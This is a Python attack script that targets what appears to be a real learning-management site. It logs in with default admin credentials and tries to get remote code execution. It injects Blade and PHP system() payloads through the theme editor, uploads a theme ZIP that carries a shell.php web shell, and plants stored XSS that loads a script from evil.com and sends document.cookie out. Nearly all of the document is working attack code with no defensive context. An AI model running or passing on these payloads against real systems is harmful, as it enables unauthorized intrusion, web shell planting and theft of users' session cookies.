import requests
import re
import time

BASE_URL = "https://lms.rocket-soft.org"
ADMIN_EMAIL = "admin@demo.com"
ADMIN_PASS = "admin"

session = requests.Session()

def login():
    print("[*] Logging in as Admin...")
    try:
        r = session.get(f"{BASE_URL}/admin/login")
        csrf_token = re.search(r'name="_token" value="([^"]+)"', r.text).group(1)
        data = {"_token": csrf_token, "email": ADMIN_EMAIL, "password": ADMIN_PASS}
        r = session.post(f"{BASE_URL}/admin/login", data=data)
        if "/admin" in r.url or "/panel" in r.url:
            print("[+] Login successful.")
            return True
        else:
            print("[-] Login failed.")
            return False
    except Exception as e:
        print(f"[-] Login error: {e}")
        return False

def get_csrf(url):
    try:
        r = session.get(url)
        match = re.search(r'name="_token" value="([^"]+)"', r.text)
        if match:
            return match.group(1), r.text
        return None, r.text
    except:
        return None, ""

def exploit_theme_editor():
    """Try to inject PHP code via Theme Editor"""
    print("\n[*] Attempting RCE via Theme Editor...")
    
    # Get themes list
    r = session.get(f"{BASE_URL}/admin/themes")
    
    # Find theme edit links
    theme_ids = re.findall(r'/admin/themes/(\d+)/edit', r.text)
    theme_ids = list(set(theme_ids))
    print(f"[*] Found theme IDs: {theme_ids}")
    
    for tid in theme_ids:
        print(f"\n[*] Checking theme ID: {tid}")
        
        # Get theme edit page
        csrf, page = get_csrf(f"{BASE_URL}/admin/themes/{tid}/edit")
        
        # Look for editable content fields (textareas, file editors, etc)
        textareas = re.findall(r'<textarea[^>]*name=["\']([^"\']+)["\'][^>]*>([^<]*)</textarea>', page, re.DOTALL)
        
        if textareas:
            print(f"    [+] Found editable fields: {[t[0] for t in textareas]}")
            
            for field_name, content in textareas:
                # Try to inject PHP
                if 'content' in field_name.lower() or 'template' in field_name.lower() or 'css' in field_name.lower():
                    print(f"    [*] Testing field: {field_name}")
                    
                    # Blade template injection payload
                    payloads = [
                        "{!! system('id') !!}",  # Blade unescaped
                        "@php system('id'); @endphp",  # Blade PHP directive
                        "<?php system($_GET['c']); ?>",  # Raw PHP
                    ]
                    
                    for payload in payloads:
                        data = {
                            '_token': csrf,
                            field_name: payload,
                            '_method': 'PUT'
                        }
                        
                        try:
                            r = session.post(f"{BASE_URL}/admin/themes/{tid}", data=data)
                            print(f"        Payload: {payload[:30]}... -> Status: {r.status_code}")
                            
                            if r.status_code in [200, 302]:
                                # Try to trigger the template
                                check = session.get(f"{BASE_URL}")
                                if "uid=" in check.text or "www-data" in check.text:
                                    print(f"\n[!!!] RCE SUCCESS via Theme Editor!")
                                    return True
                        except Exception as e:
                            print(f"        Error: {e}")
        else:
            # Check if there's a file manager or template list
            file_links = re.findall(r'href=["\']([^"\']*template[^"\']*)["\']', page, re.IGNORECASE)
            if file_links:
                print(f"    [+] Template links: {file_links[:5]}")
    
    return False

def exploit_import_feature():
    """Try RCE via theme import if available"""
    print("\n[*] Checking Theme Import Feature...")
    
    csrf, page = get_csrf(f"{BASE_URL}/admin/themes")
    
    # Look for import button/form
    if 'import' in page.lower():
        print("[+] Import feature may be available")
        
        # Look for import form action
        import_forms = re.findall(r'action=["\']([^"\']*import[^"\']*)["\']', page, re.IGNORECASE)
        print(f"    Import endpoints: {import_forms}")
        
        for endpoint in import_forms:
            # Create malicious theme ZIP
            import zipfile
            import io
            
            zip_buffer = io.BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w') as z:
                # Add shell.php to theme
                z.writestr("shell.php", "<?php system($_GET['c']); ?>")
                z.writestr("theme.json", '{"name":"rce","version":"1.0"}')
            zip_buffer.seek(0)
            
            files = {'theme': ('malicious_theme.zip', zip_buffer, 'application/zip')}
            data = {'_token': csrf}
            
            try:
                full_url = endpoint if endpoint.startswith('http') else f"{BASE_URL}{endpoint}"
                r = session.post(full_url, files=files, data=data)
                print(f"    Import attempt: Status {r.status_code}")
            except Exception as e:
                print(f"    Error: {e}")
    
    return False

def exploit_customization():
    """Try RCE via appearance customization"""
    print("\n[*] Checking Appearance Customization...")
    
    endpoints = [
        "/admin/themes/customization",
        "/admin/appearance/customize",
        "/admin/settings/appearance",
    ]
    
    for endpoint in endpoints:
        r = session.get(f"{BASE_URL}{endpoint}")
        if r.status_code == 200:
            print(f"[+] Found: {endpoint}")
            csrf, page = get_csrf(f"{BASE_URL}{endpoint}")
            
            # Check for CSS/JS injection points
            if 'custom_css' in page or 'custom_js' in page:
                print("    [!] Found custom CSS/JS injection point")
                
                # Try XSS/SSTI in custom fields
                data = {
                    '_token': csrf,
                    'custom_css': '</style><script src="//evil.com/shell.js"></script>',
                    'custom_js': 'fetch("/?rce="+btoa(document.cookie))'
                }
                
                r = session.post(f"{BASE_URL}{endpoint}", data=data)
                print(f"    Injection attempt: Status {r.status_code}")
    
    return False

def main():
    if not login():
        return
    
    if exploit_theme_editor():
        return
    
    if exploit_import_feature():
        return
    
    exploit_customization()
    
    print("\n[*] Theme-based exploitation complete.")

if __name__ == "__main__":
    main()
